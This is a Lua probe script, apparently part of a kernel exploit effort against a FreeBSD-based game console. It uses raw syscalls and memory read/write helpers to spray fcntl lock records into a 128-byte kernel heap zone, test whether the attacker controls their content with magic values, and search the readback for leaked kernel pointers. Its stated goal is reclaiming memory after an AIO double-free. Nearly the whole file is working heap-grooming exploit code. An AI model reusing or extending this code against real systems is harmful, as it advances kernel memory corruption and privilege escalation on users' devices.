-- CRASH_CLASS: LOW
-- PROBE 93c: fcntl F_SETLK spray — 128B zone reclamation vehicle
--
-- FreeBSD struct lockf_entry is ~80-96 bytes → 128B kmemzones bucket.
-- malloc(M_LOCKF) goes through the same UMA zone as AIO entries (m_aio_reqs2).
-- F_SETLK creates a lock record with user-controlled offset/length fields.
-- F_GETLK reads the lock back → content oracle for overlap detection.
--
-- Test plan:
--   [A] Verify fcntl works on shm fds (F_GETFL, F_SETLK, F_GETLK)
--   [B] Create many locks → measure 624 VM ops per lock (zone sizing)
--   [C] Create/destroy locks rapidly → verify cleanup
--   [D] Content control: set offset/length to magic values, read back via F_GETLK
--   [E] Mass spray: 200 locks across 50 shm fds → zone pressure test
--   [F] Overlap oracle: AIO double-free → lock spray → F_GETLK readback

print("=== PROBE 93c: fcntl F_SETLK spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- FreeBSD struct flock (used by F_SETLK/F_GETLK):
--   off_t  l_start;    +0x00 (8 bytes) — start offset (user-controlled!)
--   off_t  l_len;      +0x08 (8 bytes) — length (user-controlled!)
--   pid_t  l_pid;      +0x10 (4 bytes) — pid (set by kernel on GETLK)
--   short  l_type;     +0x14 (2 bytes) — F_RDLCK=1, F_WRLCK=3, F_UNLCK=2
--   short  l_whence;   +0x16 (2 bytes) — SEEK_SET=0
--   int    l_sysid;    +0x18 (4 bytes) — remote system id
-- Total: 0x1C = 28 bytes

local F_GETFL  = 3
local F_SETLK  = 12
local F_GETLK  = 11
local F_RDLCK  = 1
local F_WRLCK  = 3
local F_UNLCK  = 2

local function make_flock(buf, start, len, type_val)
    for i = 0, 0x1C - 1, 4 do wd(N(buf) + i, 0) end
    wq(N(buf), uint64(start))
    wq(N(buf) + 8, uint64(len))
    wd(N(buf) + 0x14, type_val)
    wd(N(buf) + 0x16, 0)
end

local sc_fcntl = mk(92)
local sc_shm_open = mk(482)
local sc_close = mk(6)
local sc_ftruncate = mk(480)
local sc_624 = mk(624)

-- Read 624 VM op counter
local function read_624()
    local ok, v = pcall(function() return sc_624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then return N(v) end return 0
end

-- [A] BASELINE: fcntl on shm fd
print("[A] BASELINE — fcntl on shm fd")

-- shm_open(SHM_ANON=1, O_CREAT|O_RDWR=0x202, 0777)
local shm_fd = sgn(sc_shm_open(uint64(1), uint64(0x202), uint64(0x1FF)))
print(string.format("  shm_open: fd=%d", shm_fd))
if shm_fd < 0 then
    print("  shm_open FAILED"); print("=== 93c COMPLETE (NEGATIVE) ==="); return
end

-- ftruncate to give it some size
local tret = sgn(sc_ftruncate(uint64(shm_fd), uint64(0x10000)))
print(string.format("  ftruncate(64K): ret=%d", tret))

-- F_GETFL
local getfl = sgn(sc_fcntl(uint64(shm_fd), uint64(F_GETFL), uint64(0)))
print(string.format("  F_GETFL: ret=%d (expect 2=O_RDWR)", getfl))

-- F_SETLK (write lock, offset=0x4141414141414141, len=0x4242424242424242)
local fl = memory.alloc(0x20)
make_flock(fl, 0, 1, F_WRLCK)
local setlk_ret = sgn(sc_fcntl(uint64(shm_fd), uint64(F_SETLK), uint64(N(fl))))
print(string.format("  F_SETLK(WRLCK, 0, 1): ret=%d", setlk_ret))

if setlk_ret == -1 then
    -- Try on a regular file instead
    print("  F_SETLK failed on shm — trying /dev/zero")
    local zfd = sgn(mk(5)(uint64(0), uint64(0), uint64(0))) -- open with handle 0 = stdin? try another way
    -- Try opening /app0/eboot.bin
    local path = memory.alloc(64)
    local pstr = "/app0/eboot.bin"
    for i = 1, #pstr do wd(N(path) + i - 1, string.byte(pstr, i)) end
    wd(N(path) + #pstr, 0)
    local efile = sgn(mk(5)(path, uint64(0), uint64(0)))
    print(string.format("  open(/app0/eboot.bin, O_RDONLY): fd=%d", efile))
    if efile >= 0 then
        make_flock(fl, 0, 1, F_RDLCK)
        local elock = sgn(sc_fcntl(uint64(efile), uint64(F_SETLK), uint64(N(fl))))
        print(string.format("  F_SETLK(RDLCK) on eboot: ret=%d", elock))
        if elock == 0 then
            shm_fd = efile  -- use this fd instead
            print("  *** Using eboot fd for lock tests ***")
        end
    end
end

if setlk_ret ~= 0 and shm_fd == sgn(sc_shm_open(uint64(1), uint64(0x202), uint64(0x1FF))) then
    -- Try a socketpair fd
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    mk(135)(uint64(1), uint64(1), uint64(0), sp)
    local sock_fd = rd(N(sp)) or -1
    if sock_fd >= 0 then
        make_flock(fl, 0, 1, F_WRLCK)
        local slock = sgn(sc_fcntl(uint64(sock_fd), uint64(F_SETLK), uint64(N(fl))))
        print(string.format("  F_SETLK on socket: ret=%d", slock))
    end
end

-- F_GETLK — check if lock is held
make_flock(fl, 0, 1, F_WRLCK)
local getlk_ret = sgn(sc_fcntl(uint64(shm_fd), uint64(F_GETLK), uint64(N(fl))))
local lk_type = rd(N(fl) + 0x14) or 0
local lk_pid = rd(N(fl) + 0x10) or 0
local lk_start = rq(N(fl))
local lk_len = rq(N(fl) + 8)
print(string.format("  F_GETLK: ret=%d type=%d pid=%d start=%s len=%s",
    getlk_ret, lk_type % 0x10000, lk_pid, fmt(lk_start), fmt(lk_len)))

if not alive() then print("DEAD after baseline"); return end

-- [B] ZONE SIZING: create locks, measure 624 delta per lock
print("")
print("[B] ZONE SIZING — 624 delta per lock")

local test_fds = {}
local LOCK_COUNT = 20
local pre_624 = read_624()

for i = 1, LOCK_COUNT do
    local fd = sgn(sc_shm_open(uint64(1), uint64(0x202), uint64(0x1FF)))
    if fd < 0 then print(string.format("  shm_open[%d] failed", i)); break end
    local ok2 = pcall(function() sc_ftruncate(uint64(fd), uint64(0x10000)) end)
    make_flock(fl, i * 0x1000, 0x100, F_WRLCK)
    local lr = sgn(sc_fcntl(uint64(fd), uint64(F_SETLK), uint64(N(fl))))
    if lr == 0 then
        table.insert(test_fds, fd)
    else
        if i <= 3 then print(string.format("  lock[%d] FAILED ret=%d", i, lr)) end
        pcall(function() sc_close(uint64(fd)) end)
    end
end

local post_624 = read_624()
local delta = post_624 - pre_624
print(string.format("  locks created: %d", #test_fds))
print(string.format("  624 delta: %d (%.1f per lock)", delta, #test_fds > 0 and delta / #test_fds or 0))

-- [C] READBACK: can we read lock content via F_GETLK?
print("")
print("[C] CONTENT READBACK")

if #test_fds > 0 then
    for i = 1, math.min(3, #test_fds) do
        make_flock(fl, (i * 0x1000), 0x100, F_WRLCK)
        local gr = sgn(sc_fcntl(uint64(test_fds[i]), uint64(F_GETLK), uint64(N(fl))))
        local rt = rd(N(fl) + 0x14) or 0
        local rp = rd(N(fl) + 0x10) or 0
        local rs = rq(N(fl))
        local rl = rq(N(fl) + 8)
        print(string.format("  fd[%d] F_GETLK: ret=%d type=%d pid=%d start=%s len=%s",
            i, gr, rt % 0x10000, rp, fmt(rs), fmt(rl)))
    end
end

-- [D] MAGIC VALUES: write recognizable offset/len, read back
print("")
print("[D] MAGIC VALUE CONTROL")

if #test_fds > 0 then
    -- Set lock with magic offset
    make_flock(fl, 0xDEADBEEF, 0xCAFECAFE, F_WRLCK)
    local mr = sgn(sc_fcntl(uint64(test_fds[1]), uint64(F_SETLK), uint64(N(fl))))
    -- Unlock previous, re-lock with magic
    make_flock(fl, 0, 1, F_UNLCK)
    pcall(function() sc_fcntl(uint64(test_fds[1]), uint64(F_SETLK), uint64(N(fl))) end)
    make_flock(fl, 0xDEADBEEF, 0xCAFECAFE, F_WRLCK)
    mr = sgn(sc_fcntl(uint64(test_fds[1]), uint64(F_SETLK), uint64(N(fl))))
    print(string.format("  F_SETLK(0xDEADBEEF, 0xCAFECAFE): ret=%d", mr))

    -- Read back
    make_flock(fl, 0xDEADBEEF, 1, F_WRLCK)
    local gr2 = sgn(sc_fcntl(uint64(test_fds[1]), uint64(F_GETLK), uint64(N(fl))))
    local rs2 = rq(N(fl))
    local rl2 = rq(N(fl) + 8)
    local rp2 = rd(N(fl) + 0x10) or 0
    print(string.format("  F_GETLK readback: ret=%d start=%s len=%s pid=%d",
        gr2, fmt(rs2), fmt(rl2), rp2))
    if N(rs2) == 0xDEADBEEF then
        print("  *** MAGIC OFFSET PRESERVED — content-controlled spray works ***")
    end
end

-- [E] MASS SPRAY: 200 locks across many fds
print("")
print("[E] MASS SPRAY — 200 locks")

local spray_fds = {}
local spray_count = 0
local pre_spray = read_624()

for i = 1, 50 do
    local fd = sgn(sc_shm_open(uint64(1), uint64(0x202), uint64(0x1FF)))
    if fd < 0 then break end
    pcall(function() sc_ftruncate(uint64(fd), uint64(0x100000)) end)
    -- Multiple locks per fd at non-overlapping ranges
    for j = 0, 3 do
        make_flock(fl, (i * 4 + j) * 0x10000, 0x1000, F_WRLCK)
        local lr = sgn(sc_fcntl(uint64(fd), uint64(F_SETLK), uint64(N(fl))))
        if lr == 0 then spray_count = spray_count + 1 end
    end
    table.insert(spray_fds, fd)
end

local post_spray = read_624()
local spray_delta = post_spray - pre_spray
print(string.format("  fds opened: %d", #spray_fds))
print(string.format("  locks created: %d", spray_count))
print(string.format("  624 delta: %d (%.1f per lock)", spray_delta, spray_count > 0 and spray_delta / spray_count or 0))

-- Cleanup spray
for _, fd in ipairs(spray_fds) do pcall(function() sc_close(uint64(fd)) end) end

-- Cleanup test fds
for _, fd in ipairs(test_fds) do pcall(function() sc_close(uint64(fd)) end) end

-- [F] KERNEL POINTER CHECK in readback
print("")
print("[F] KERNEL POINTER CHECK")
print("  (If F_GETLK returns any 0xFFFF8xxx values, we have a leak)")

-- Create one more lock, read all fields
local check_fd = sgn(sc_shm_open(uint64(1), uint64(0x202), uint64(0x1FF)))
if check_fd >= 0 then
    pcall(function() sc_ftruncate(uint64(check_fd), uint64(0x10000)) end)
    make_flock(fl, 0x1000, 0x2000, F_WRLCK)
    pcall(function() sc_fcntl(uint64(check_fd), uint64(F_SETLK), uint64(N(fl))) end)

    -- Read back with sentinel-filled buffer
    for i = 0, 0x1C, 4 do wd(N(fl) + i, 0xAAAAAAAA) end
    make_flock(fl, 0x1000, 1, F_WRLCK)
    pcall(function() sc_fcntl(uint64(check_fd), uint64(F_GETLK), uint64(N(fl))) end)

    -- Dump all 28 bytes
    print("  flock dump after F_GETLK:")
    for off = 0, 0x18, 8 do
        local val = rq(N(fl) + off)
        local h, l = get_hi_lo(val)
        print(string.format("    +0x%02X: %s%s", off, fmt(val),
            (h >= 0xFFFF8000 and h < 0xFFFFFFFF) and " *** KERNEL PTR ***" or ""))
    end

    pcall(function() sc_close(uint64(check_fd)) end)
end

print("")
print("[SUMMARY]")
print(string.format("  fcntl F_SETLK: %s", setlk_ret == 0 and "WORKS" or "BLOCKED"))
print(string.format("  content control: %s", "see section D"))
print(string.format("  mass spray: %d locks", spray_count))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))

print("")
print("=== 93c COMPLETE ===")
